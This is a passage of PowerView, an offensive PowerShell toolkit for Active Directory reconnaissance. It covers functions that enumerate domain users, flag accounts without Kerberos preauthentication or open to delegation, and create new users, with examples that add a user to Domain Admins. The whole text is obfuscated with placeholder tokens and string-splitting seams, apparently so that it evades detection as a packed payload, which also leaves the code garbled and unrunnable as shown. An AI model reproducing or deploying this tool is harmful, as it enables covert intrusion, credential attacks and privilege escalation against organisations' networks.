If -ReferenceObject is specified, this will be automatically extracted, if possible.

.PARAMETER ReferencePropertySet

Specifies an array of property names to diff against the class schema.

.PARAMETER ReferenceObject

Specicifes the PowerView user/group/computer object to extract property names
from to use as the reference set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Sp'+'ecifies the PageSize to set for the LDAP searcher object.

.PA'+'RAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 41aUser41a

Enumerates users in the current domain with 41aoutlier41a properties filled in.

.EXAMPLE

Find-DomainObjectPropertyOutlier -ClassName 41aGroup41a -Domain external.local

Enumerates groups in the external.local forest/domain with 41aoutlier41a properties filled in.

.EXAMPLE

Get-DomainComputer -FindOne U9B Find-DomainObjectPropertyOutlier

Enumerates computers in the current domain with 41aoutlier41a properties filled in.

.OUTPUTS

PowerView.PropertyOutlier

Custom PSObject with translated object pr'+'operty outliers.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.PropertyOutlier41a)]
    [CmdletBinding(DefaultParameterSetName = 41aClassName41a)]
    Param(
        [Parameter(Position = 0, Mandatory = gIF1True, ParameterSetName = 41aClassName41a)]
        [Alias(41aClass41a)]
        [ValidateSet(41aUser41a, 41aGroup41a, 41aComputer41a)]
        [String]
        gIF1ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1ReferencePropertySet,

        [Parameter(ValueFromPipeline = gIF1True, Mandatory = gIF1True, ParameterSetName = 41aReferenceObject41a)]
        [PSCustomObject]
        gIF1ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1UserReferencePropertySet = @(41aadmincount41a,41aaccountexpires41a,41abadpasswordtime41a,41abadpwdcount41a,41acn41a,41acodepage41a,41acountrycode41a,41adescription41a, 41adisplayname41a,41adistinguishedname41a,41adscorepropagationdata41a,41agivenname41a,41ainstancetype41a,41aiscriticalsystemobject41a,41alastlogoff41a,41alastlogon41a,41alastlogontimestamp41a,41alockouttime41a,41alogoncount41a,41amemberof41a,41amsds-supportedencryptiontypes41a,41aname41a,41aobjectcategory41a,41aobjectclass41a,41aobjectguid41a,41aobjectsid41a,41aprimarygroupid41a,41apwdlastset41a,41asamaccountname41a,41asamaccounttype41a,41asn41a,41auseraccountcontrol41a,41auserprincipalname41a,41ausnchanged41a,41ausncreated41a,41awhenchanged41a,41awhencreated41a)

        gIF1GroupReferencePropertySet = @(41aadmincount41a,41acn41a,41adescription41a,41adistinguishedname41a,41adscorepropagationdata41a,41agrouptype41a,41ainstancetype41a,41aiscriticalsystemobject41a,41amember41a,41amemberof41a,41aname41a,41aobjectcategory41a,41aobjectclass41a,41aobjectguid41a,41aobjectsid41a,41asamaccountname41a,41asamaccounttype41a,41asystemflags41a,41ausnchanged41a,41ausncreated41a,41awhenchanged41a,41awhencreated41a)

        gIF1ComputerReferencePropertySet = @(41aaccountexpires41a,41abadpasswordtime41a,41abadpwdcount41a,41acn41a,41acodepage41a,41acountrycode41a,41adistinguishedname41a,41adnshostname41a,41adscorepropagationdata41a,41ainstancetype41a,41'+'aiscriticalsystemobject41a,41alastlogoff41a,41alastlogon41a,41alastlogontimestamp41a,41alocalpolicyflags41a,41alogoncount41a,41amsds-supportedencryptiontypes41a,41aname41a,41aobjectcategory41a,41aobjectclass41a,41aobjectguid41a,41aobjectsid41a,41aoperatingsystem41a,41aoperatingsystemservicepack41a,41aoperatingsystemversion41a,41aprimarygroupid41a,41apwdlastset41a,41asamaccountname41a,41asamaccounttype41a,41aserviceprincipalname41a,41auseraccountcontrol41a,41ausnchanged41a,41ausncreated41a,41awhenchanged41a,41awhencreated41a)

        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1SearcherArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombst'+'one41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        # Domain / Credential
        if (gIF1PSBoundParameters[41aDomain41a]) {
            if (gIF1PSBoundParameters[41aCredential41a]) {
                gIF1TargetForest = Get-Domain -Domain gIF1Domain U9B Select-Object -ExpandProperty Forest U9B Select-Object -ExpandProperty Name
            }
            else {
                gIF1TargetForest = Get-Domain -Domain gIF1Domain -Credential gIF1Credential U9B Select-Object -ExpandProperty Forest U9B Select-Object -ExpandProperty Name
            }
            Write-Verbose Zfr[Find-DomainObjectPropertyOutlier] Enumerated forest 41agIF1TargetForest41a for target domain 41agIF1Domain41aZfr
        }

        gIF1SchemaArguments = @{}
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SchemaArguments[41aCredential41a] = gIF1Credential }
        if (gIF1TargetForest) {
            gIF1SchemaArguments[41aForest41a] = gIF1TargetForest
        }
    }

    PROCESS {

        if (gIF1PSBoundParameters[41aReferencePropertySet41a]) {
            Write-Verbose Zfr[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySetZfr
            gIF1ReferenceObjectProperties = gIF1ReferencePropertySet
        }
        elseif (gIF1PSBoundParameters[41aReferenceObject41a]) {
            Write-Verbose Zfr[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property setZfr
            gIF1ReferenceObjectProperties = Get-Member -InputObject gIF1ReferenceObject -MemberType NoteProperty U9B Select-Object -Expand Name
            gIF1ReferenceObjectClass = gIF1ReferenceObject.objectclass U9B Select-Object -Last 1
            Write-Verbose Zfr[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : gIF1ReferenceObjectClassZfr
        }
        else {
            Write-Verbose Zfr[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class 41agIF1ClassName41aZfr
        }

        if ((gIF1ClassName -eq 41aUser41a) -or (gIF1ReferenceObjectClass -eq 41aUser41a)) {
            gIF1Objects = Get-DomainUser @SearcherArguments
            if (-not gIF1ReferenceObjectProperties) {
                gIF1ReferenceObjectProperties = gIF1UserReferencePropertySet
            }
        }
        elseif ((gIF1ClassName -eq 41aGroup41a) -or (gIF1ReferenceObjectClass -eq 41aGroup41a)) {
            gIF1Objects = Get-DomainGroup @SearcherArguments
            if (-not gIF1ReferenceObjectProperties) {
                gIF1ReferenceObjectProperties = gIF1GroupReferencePropertySet
            }
        }
        elseif ((gIF1ClassName -eq 41aComputer41a) -or (gIF1ReferenceObjectClass -eq 41aComputer41a)) {
            gIF1Objects = Get-DomainComputer @SearcherArguments
            if (-not gIF1ReferenceObjectProperties) {
                gIF1ReferenceObjectProperties = gIF1ComputerReferencePropertySet
            }
        }
        else {
            throw Zfr[Find-DomainObjectPropertyOutlier] Invalid class: gIF1ClassNameZfr
        }

        ForEach (gIF1Object in gIF1Objects) {
            gIF1ObjectProperties = Get-Member -InputObject gIF1Object -MemberType NoteProperty U9B Select-Object -Expand Name
            ForEach(gIF1ObjectProperty in gIF1ObjectProperties) {
                if (gIF1ReferenceObjectProperties -NotContains gIF1ObjectProperty) {
                    gIF1Out = New-Object PSObject
                    gIF1Out U9B Add-Member Noteproperty 41aSamAccountName41a gIF1Object.SamAccountName
                    gIF1Out U9B Add-Member Noteproperty 41aProperty41a gIF1ObjectProperty
                    gIF1Out U9B Add-Member Noteproperty 41aValue41a gIF1Object.gIF1ObjectProperty
                    gIF1Out.PSObject.TypeNames.Insert(0, 41aPowerView.PropertyOutlier41a)
                    gIF1Out
                }
            }
        }
    }
}


########################################################
#
# Zfrnet *Zfr replacements and other fun start below
#
########################################################

function Get-DomainUser {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher o'+'bject using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter p'+'arameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties samaccountname,usnchanged,...Zf'+'r. By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAINYwWuser format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from gIF1UACEnum, including
ZfrNOT_XZfr negation forms. To see all possible values, run 41a0U9BConvertFrom-UACValue -ShowAll41a.

.PARAMETER AdminCount

Switch. Return users with 41a(adminCount=1)41a (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as 41asensitive and not allowed for delegation41a

.PARAMETER DisallowDelegation

Switch. Return user '+'accounts that are marked as 41asensitive and not allowed for delegation41a

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with ZfrDo not require Kerber'+'os preauthenticationZfr set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
'+'

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41a'+'Owner41a, 41aSacl41a.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser ZfrS-1-5-21-890171859-3433809279-3366196753-1108Zfr,ZfradministratorZfr

Return the user with the given SID, as well as Administrator.

.EXAMPLE

41aS-1-5-21-890171859-3433809279-3366196753-111441a, 41aCN=dfm,CN=Users,DC=testlab,DC=local41a,41a4c435dd7-dc58-4b14-9a5e-1fdb0e80d20141a,41aadministrator41a U9B Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase ZfrLDAP://OU=secret,DC=testlab,DC=localZfr -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter 41a(!primarygroupid=513)41a -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 (41adomain users41a) and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesn41at require Kerberos preauthentication and DON41aT have an expired password.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainUser -Credential gIF1Cred

.EXAMPLE

Get-Domain U9B Select-Object -Expand name
testlab.local

Get-DomainUser devYwWuser1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(U9B(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.User41a)]
    [OutputType(41aPowerView.User.Raw41a)]
    [CmdletBinding(DefaultParameterSetName = 41aAllowDelegation41a)]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a, 41aMemberDistinguishedName41a, 41aMemberName41a)]
        [String[]]
        gIF1Identity,

        [Switch]
        gIF1SPN,

        [Switch]
        gIF1AdminCount,

        [Parameter(ParameterSetName = 41aAllowDelegation41a)]
        [Switch]
        gIF1AllowDelegation,

        [Parameter(ParameterSetName = 41aDisallowDelegation41a)]
        [Switch]
        gIF1DisallowDelegation,

        [Switch]
        gIF1TrustedToAuth,

        [Alias(41aKerberosPreauthNotRequired41a, 41aNoPreauth41a)]
        [Switch]
        gIF1PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = '+'[Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    DynamicParam {
        gIF1UACValueNames = [Enum]::GetNames(gIF1UACEnum)
        # add in the negations
        gIF1UACValueNames = gIF1UACValueNames U9B ForEach-Object {gIF1_; ZfrNOT_gIF1_Zfr}
        # create new dynamic parameter
        New-DynamicParameter -Name UACFilter -ValidateSet gIF1UACValueNames -Type ([array])
    }

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (gIF1PSBoundParameters -and (gIF1PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters gIF1PSBoundParameters
        }

        if (gIF1UserSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^S-1-41a) {
                    gIF1IdentityFilter += Zfr(objectsid=gIF1IdentityInstance)Zfr
                }
                elseif (gIF1IdentityInstance -match 41a^CN=41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.Sub'+'String(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                 '+'       Write-Verbose Zfr[Get-DomainUser] Extracted domain 41agIF1IdentityDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1IdentityDomain
                        gIF1UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not gIF1UserSearcher) {
                            Write-Warning Zfr[Get-DomainUser] Unable to retrieve domain searcher for 41agIF1IdentityDomain41aZfr
                        }
                    }
                }
                elseif (gIF1IdentityInstance -imatch 41a^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}gIF141a) {
                    gIF1GuidByteString = (([Guid]gIF1IdentityInstance).ToByteArray() U9B ForEach-Object { 41aYwW41a + gIF1_.ToString(41aX241a) }) -join 41a41a
                    gIF1IdentityFilter += Zfr(objectguid=gIF1GuidByteString)Zfr
                }
                elseif (gIF1IdentityInstance.Contains(41aYwW41a)) {
                    gIF1ConvertedIdentityInstance = gIF1IdentityInstance.Repla'+'ce(41aYwW2841a, 41a(41a).Replace(41aYwW2941a, 41a)41a) U9B Convert-ADName -OutputType Canonical
  '+'                  if (gIF1ConvertedIdentityInstance) {
                        gIF1UserDomain = gIF1ConvertedIdentityInstance.SubString(0, gIF1ConvertedIdentityInstance.IndexOf(41a/41a))
                        gIF1UserName = gIF1IdentityInstance.Split(41aYwW41a)[1]
                        gIF1IdentityFilter += Zfr(samAccountName=gIF1UserName)Zfr
                        gIF1SearcherArguments[41aDomain41a] = gIF1UserDomain
                        Write-Verbose Zfr[Get-DomainUser] Extracted domain 41agIF1UserDomain41a from 41agIF1IdentityInstance41aZfr
                        gIF1UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    gIF1IdentityFilter += Zfr(samAccountName=gIF1IdentityInstance)Zfr
                }
            }

            if (gIF1IdentityFilter -and (gIF1IdentityFilter.Trim() -ne 41a41a) ) {
                gIF1Filter += Zfr(U9BgIF1IdentityFilter)Zfr
            }

            if (gIF1PSBoundParameters[41aSPN41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for non-null service principal names41a
                gIF1Filter += 41a(servicePrincipalName=*)41a
            }
            if (gIF1PSBoundParameters[41aAllowDelegation41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for users who can be delegated41a
                #'+' negation '+'of ZfrAccounts that are sensitive and not trusted for delegationZfr
                gIF1Filter += 41a(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))41a
            }
            if (gIF1PSBoundParameters[41aDisallowDelegation41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation41a
                gIF1Filter += 41a(userAccountControl:1.2.840.113556.1.4.803:=1048574)41a
            }
            if (gIF1PSBoundParameters[41aAdminCount41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for adminCount=141a
                gIF1Filter += 41a(admincount=1)41a
            }
            if (gIF1PSBoundParameters[41aTrustedToAuth41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for users that are trusted to authenticate for other principals41a
 '+'               gIF1Filter +'+'= 41a(msds-allowedtodelegateto=*)41a
            }
            if (gIF1PSBoundParameters[41aPreauthNotRequired41a]) {
                Write-Verbose 41a[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate41a
                gIF1Filter += 41a(userAccountControl:1.2.840.113556.1.4.803:=4194304)41a
            }
            if (gIF1PSBoundParameters[41aLDAPFilter41a]) {
                Write-Verbose Zfr[Get-DomainUser] Using additional LDAP filter: gIF1LDAPFilterZfr
                gIF1Filter += ZfrgIF1LDAPFilterZfr
            }

            # build the LDAP filter for the dynamic UAC filter value
            gIF1UACFilter U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1_ -match 41aNOT_.*41a) {
                    gIF1UACField = gIF1_.Substring(4)
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1UACField)
                    gIF1Filter += Zfr(!(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue))Zfr
                }
                else {
                    gIF1UACValue = [Int](gIF1UACEnum::gIF1_)
                    gIF1Filter += Zfr(userAccountControl:1.2.840.113556.1.4.803:=gIF1UACValue)Zfr
                }
            }

            gIF1UserSearcher.filter = Zfr(&(samAccountType=805306368)gIF1Filter)Zfr
            Write-Verbose Zfr[Get-DomainUser] filter string: gIF1(gIF1UserSearcher.filter)Zfr

            if (gIF1PSBoundParameters[41aFindOne41a]) { gIF1Results = gIF1UserSearcher.FindOne() }
            else { gIF1Results = gIF1UserSearcher.FindAll() }
            gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                if (gIF1PSBoundParameters[41aRaw41a]) {
                    # return raw result objects
                    gIF1User = gIF1_
                    gIF1User.PSObject.TypeNames.Insert(0, 41aPowerView.User.Raw41a)
                }
                else {
                    gIF1User = Convert-LDAPProperty -Properties gIF1_.Properties
                    gIF1User.PSObject.TypeNames.Insert(0, 41aPowerView.User41a)
                }
                gIF1User
            }
            if (gIF1Results) {
                try { gIF1Results.dispose() }
                catch {
                    Write-Verbose Zfr[Get-DomainUser] Error disposing of the Results object: gIF1_Zfr
                }
            }
            gIF1UserSearcher.dispose()
        }
    }
}


function New-DomainUser {
<#
.SYNOPSIS

Creates a new domain user (assuming appropriate permissions) and returns the user object.

TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the user to create.
Maximum of 256 characters. Mandatory.

.PARAMETER AccountPassword

Specifies the password for the created user. Mandatory.

.PARAMETER Name

Specifies the name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the user to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

'+'gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 41aThis is harmj0y41a -AccountPassword gIF1UserPassword

Creates the 41aharmj0y241a user with the specified description and password.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1user = New-DomainUser -SamAccountName harmj0y2 -Description 41aThis is harmj0y41a -AccountPassword gIF1UserPassword -Credential gIF1Cred

Creates the 41aharmj0y241a user with the specified description and password, using the specified
alternate credentials.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
gIF1UserPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword gIF1UserPassword -Credential gIF1Cred U9B Add-DomainGroupMember 41aDomain Admins41a -Credential gIF1Cred

Creates the 41aandy41a user with the specified description and password, using the specified
alternate credentials, and adds the user to 41adomain admins41a using Add-DomainGroupMember
and the alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseShouldProcessForStateChangingFunctions41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aDi'+'rectoryServices.AccountManagement.UserPrincipal41a)]
    Param(
        [Parameter(Mandatory = gIF1True)]
        [ValidateLength(0, 256)]
        [String]
        gIF1SamAccountName,

        [Parameter(Mandatory = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aPassword41a)]
        [Security.SecureString]
        gIF1AccountPassword,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Name,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1DisplayName,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Description,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    gIF1ContextArguments = @{
        41aIdentity41a = gIF1SamAccountName
    }
    if (gIF1PSBoundParameters[41aDomain41a]) { gIF1ContextArguments[41aDomain41a] = gIF1Domain }
    if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ContextArguments[41aCredential41a] = gIF1Credential }
    gIF1Context = Get-PrincipalContext @ContextArguments

    if (gIF1Context) {
        gIF1User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList (gIF1Context.Context)

        # set all the appropriate user parameters
        gIF1User.SamAccountName = gIF1Context.Identity
        gIF1TempCred = New-Object System.Management.Automation.PSCredential(41aa41a,'+' gIF1AccountPassword)
        gIF1User.SetPassword(gIF1TempCred.GetNetworkCredential().Password)
        gIF1User.Enabled = gIF1True
        gIF1User.PasswordNotRequired = gIF1False

        if (gIF1PSBoundParameters[41aName41a]) {
            gIF1User.Name = gIF1Name
        }
        else {
            gIF1User.Name = gIF1Context.Identity
        }
        if (gIF1PSBoundParameters[41aDisplayName41a]) {
            gIF1User.DisplayName = gIF1DisplayName
        }
        else {
            gIF1User.DisplayName = gIF1Context.Identity
        }

        if (gIF1PSBoundParameters[41aDescription41a]) {
            gIF1User.Description = gIF1Description
        }

